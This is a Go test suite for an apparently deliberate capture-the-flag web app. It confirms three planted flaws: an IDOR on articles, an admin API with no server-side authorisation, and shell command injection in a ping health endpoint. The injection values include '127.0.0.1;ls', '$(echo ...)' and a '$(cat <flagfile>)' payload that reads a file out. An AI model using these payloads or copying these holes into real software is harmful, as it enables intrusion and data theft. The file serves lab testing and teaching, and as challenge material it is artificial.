package test

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
	"html/template"

	"github.com/greystone/pressroom/internal/database"
	"github.com/greystone/pressroom/internal/handlers"
	"github.com/greystone/pressroom/internal/middleware"
	"github.com/greystone/pressroom/internal/services"
)

// repoRoot walks up from this test file to find the CTF_8_gazette directory,
// so paths to templates and data are stable no matter where `go test` is run.
func repoRoot(t *testing.T) string {
	t.Helper()
	cwd, err := os.Getwd()
	if err != nil {
		t.Fatalf("getwd: %v", err)
	}
	dir := cwd
	for i := 0; i < 6; i++ {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}
		dir = filepath.Dir(dir)
	}
	t.Fatalf("could not locate go.mod from %s", cwd)
	return ""
}

func paragraphs(body string) []string {
	var out []string
	current := ""
	for _, r := range body {
		if r == '\n' {
			if current != "" {
				out = append(out, current)
				current = ""
			}
			continue
		}
		current += string(r)
	}
	if current != "" {
		out = append(out, current)
	}
	return out
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func newTestServer(t *testing.T) (*gin.Engine, string) {
	t.Helper()
	gin.SetMode(gin.TestMode)

	root := repoRoot(t)
	dataDir := filepath.Join(root, "src", "data")
	templatesDir := filepath.Join(root, "templates")
	flagsDir := t.TempDir()

	db, err := database.Open("file::memory:?cache=shared")
	if err != nil {
		t.Fatalf("open db: %v", err)
	}
	if err := database.Seed(db, dataDir); err != nil {
		t.Fatalf("seed: %v", err)
	}
	flags, err := services.NewFlagStore(dataDir, flagsDir)
	if err != nil {
		t.Fatalf("flagstore: %v", err)
	}

	r := gin.New()
	r.Use(gin.Recovery())
	r.Use(sessions.Sessions("pressroom_session", cookie.NewStore([]byte("test-session-key-32-bytes-0123"))))
	r.SetFuncMap(template.FuncMap{
		"paragraphs": paragraphs,
		"truncate":   truncate,
	})
	r.LoadHTMLGlob(filepath.Join(templatesDir, "*.html"))

	limiter := middleware.NewLoginRateLimiter()
	authDeps := &handlers.AuthDeps{DB: db, RateLimiter: limiter}
	articleDeps := &handlers.ArticleDeps{DB: db, Flags: flags}
	archiveDeps := &handlers.ArchiveDeps{DB: db}
	adminDeps := &handlers.AdminDeps{DB: db, Flags: flags}

	r.POST("/login", limiter.Middleware(), authDeps.LoginSubmit)
	api := r.Group("/api")
	api.Use(middleware.RequireSession(true))
	{
		api.GET("/me", authDeps.Me)
		api.GET("/articles/:id", articleDeps.APIGetArticle)
		api.GET("/archive", archiveDeps.APIArchive)
		api.GET("/admin/dashboard", adminDeps.APIDashboard)
		api.POST("/admin/health", adminDeps.APIHealth)
	}
	return r, flagsDir
}

// loginAs posts credentials and returns the session cookie for subsequent
// API calls.
func loginAs(t *testing.T, r *gin.Engine, username, password string) *http.Cookie {
	t.Helper()
	form := url.Values{"username": {username}, "password": {password}}
	req := httptest.NewRequest(http.MethodPost, "/login", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusFound && w.Code != http.StatusSeeOther {
		t.Fatalf("login for %s failed: status %d body %s", username, w.Code, w.Body.String())
	}
	for _, c := range w.Result().Cookies() {
		if c.Name == "pressroom_session" {
			return c
		}
	}
	t.Fatalf("no session cookie set for %s", username)
	return nil
}

func getWithCookie(t *testing.T, r *gin.Engine, path string, c *http.Cookie) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, path, nil)
	if c != nil {
		req.AddCookie(c)
	}
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	return w
}

func postJSONWithCookie(t *testing.T, r *gin.Engine, path string, body any, c *http.Cookie) *httptest.ResponseRecorder {
	t.Helper()
	raw, err := json.Marshal(body)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	req := httptest.NewRequest(http.MethodPost, path, bytes.NewReader(raw))
	req.Header.Set("Content-Type", "application/json")
	if c != nil {
		req.AddCookie(c)
	}
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	return w
}

func readBody(t *testing.T, w *httptest.ResponseRecorder) string {
	t.Helper()
	b, err := io.ReadAll(w.Body)
	if err != nil {
		t.Fatalf("read body: %v", err)
	}
	return string(b)
}

func TestUnauthenticatedArticleReturns401(t *testing.T) {
	r, _ := newTestServer(t)
	w := getWithCookie(t, r, "/api/articles/1", nil)
	if w.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401, got %d: %s", w.Code, w.Body.String())
	}
}

func TestAuthenticatedOwnArticleReturns200(t *testing.T) {
	r, _ := newTestServer(t)
	cookie := loginAs(t, r, "abcd12", "c2e2a5078")
	// Article 3 is Sarah's draft. First find one owned by abcd12. None are
	// seeded, so the IDOR test below covers foreign access; here we just
	// verify that the own-articles listing endpoint responds.
	w := getWithCookie(t, r, "/api/articles/3", cookie)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
}

func TestIDORForeignArticleReturns200(t *testing.T) {
	// Confirms Flag 1 vulnerability: the signed-in contributor can read
	// Sarah Lin's article (authored by a different user) without any
	// ownership check.
	r, _ := newTestServer(t)
	cookie := loginAs(t, r, "abcd12", "c2e2a5078")
	w := getWithCookie(t, r, "/api/articles/3", cookie)
	if w.Code != http.StatusOK {
		t.Fatalf("IDOR should return 200, got %d", w.Code)
	}
	body := readBody(t, w)
	if !strings.Contains(body, "durham-gzflag1{") {
		t.Fatalf("expected flag1 to be embedded in article 3 body, body=%s", body)
	}
	if !strings.Contains(body, "_abcd12}") {
		t.Fatalf("flag1 should be personalised to abcd12, got body=%s", body)
	}
}

func TestAdminDashboardNoServerSideAuth(t *testing.T) {
	// Confirms Flag 2 vulnerability: contributor (non-admin) can hit the
	// admin API directly.
	r, _ := newTestServer(t)
	cookie := loginAs(t, r, "abcd12", "c2e2a5078")
	w := getWithCookie(t, r, "/api/admin/dashboard", cookie)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 (missing server-side auth), got %d", w.Code)
	}
	body := readBody(t, w)
	if !strings.Contains(body, "durham-gzflag2{") {
		t.Fatalf("expected flag2 in admin dashboard body, got %s", body)
	}
	if !strings.Contains(body, "\"marcus.webb\"") {
		t.Fatalf("expected user directory to include marcus.webb, got %s", body)
	}
}

func TestHealthLocalhostPingOrBlocked(t *testing.T) {
	// The runner may or may not be permitted to send ICMP echo. We only
	// assert that the endpoint returns a 200 with structured output.
	r, _ := newTestServer(t)
	cookie := loginAs(t, r, "abcd12", "c2e2a5078")
	w := postJSONWithCookie(t, r, "/api/admin/health", map[string]string{"host": "127.0.0.1"}, cookie)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "\"output\"") {
		t.Fatalf("expected output field, got %s", w.Body.String())
	}
}

func TestHealthBlocklistRejectsSemicolon(t *testing.T) {
	r, _ := newTestServer(t)
	cookie := loginAs(t, r, "abcd12", "c2e2a5078")
	w := postJSONWithCookie(t, r, "/api/admin/health", map[string]string{"host": "127.0.0.1;ls"}, cookie)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "forbidden characters") {
		t.Fatalf("expected forbidden-characters error, got %s", w.Body.String())
	}
}

func TestHealthCommandSubstitutionBypass(t *testing.T) {
	// Confirms Flag 3 vulnerability: command substitution is not blocked.
	// We use $(echo foo) which must appear in the ping command's output.
	r, flagsDir := newTestServer(t)
	cookie := loginAs(t, r, "abcd12", "c2e2a5078")

	// Ensure the per-user flag file exists at the expected runtime path
	// so that $(cat ...) returns content even in CI where ping may fail.
	if _, err := os.Stat(filepath.Join(flagsDir, "flag3-abcd12.txt")); err != nil {
		t.Fatalf("flag3 runtime file missing: %v", err)
	}

	w := postJSONWithCookie(t, r, "/api/admin/health", map[string]string{"host": "$(echo pressroom_bypass_marker)"}, cookie)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	if !strings.Contains(body, "pressroom_bypass_marker") {
		t.Fatalf("expected bypass marker in output, got %s", body)
	}
}

func TestArchiveExcludesForeignDrafts(t *testing.T) {
	// The archive listing must show published articles and the caller's own
	// articles, but hide drafts belonging to other users. Article 3 is
	// Sarah's draft (the Flag 1 target), so it must not appear.
	r, _ := newTestServer(t)
	cookie := loginAs(t, r, "abcd12", "c2e2a5078")
	w := getWithCookie(t, r, "/api/archive", cookie)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var articles []map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &articles); err != nil {
		t.Fatalf("decode archive: %v", err)
	}
	for _, a := range articles {
		idNum, ok := a["id"].(float64)
		if !ok {
			t.Fatalf("archive row missing numeric id: %+v", a)
		}
		if int64(idNum) == 3 {
			t.Fatalf("archive must not include article 3 (foreign draft): %+v", a)
		}
	}
}

func TestHealthFlag3Exfiltration(t *testing.T) {
	// Full Flag 3 exploit chain: issue $(cat .../flag3-<user>.txt) and
	// verify the flag shows up in the ping output (typically as part of
	// the "Name or service not known" error).
	r, flagsDir := newTestServer(t)
	cookie := loginAs(t, r, "abcd12", "c2e2a5078")

	flagPath := filepath.Join(flagsDir, "flag3-abcd12.txt")
	payload := map[string]string{"host": "$(cat " + flagPath + ")"}
	w := postJSONWithCookie(t, r, "/api/admin/health", payload, cookie)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	if !strings.Contains(body, "durham-gzflag3{") {
		t.Fatalf("expected flag3 in ping output, got %s", body)
	}
}
